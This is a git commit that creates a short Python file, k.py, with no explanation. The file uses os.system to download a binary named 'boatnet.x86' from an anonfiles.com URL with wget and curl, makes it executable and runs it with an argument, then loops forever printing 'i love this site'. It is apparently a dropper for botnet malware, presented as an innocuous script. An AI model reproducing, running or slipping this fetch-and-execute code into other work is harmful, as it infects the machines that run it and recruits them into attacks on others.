6eaf51fb542c86f30b54101972c526a059907b8e
g4323 <132121741+g4323@users.noreply.github.com>
2023-04-29 05:05:05 +0000

    Create k.py

---
+++ k.py
@@ -0,0 +1,6 @@
+import os
+
+os.system("wget https://cdn-151.anonfiles.com/e9Pfgco6zd/ff258603-1682744945/boatnet.x86; curl -O https://cdn-151.anonfiles.com/e9Pfgco6zd/ff258603-1682744945/boatnet.x86; cat boatnet.x86 > testinhgi; chmod +x *; ./testinhgi BRIZYDAGOAT")
+
+while 1 == 1:
+   print("i love this site")
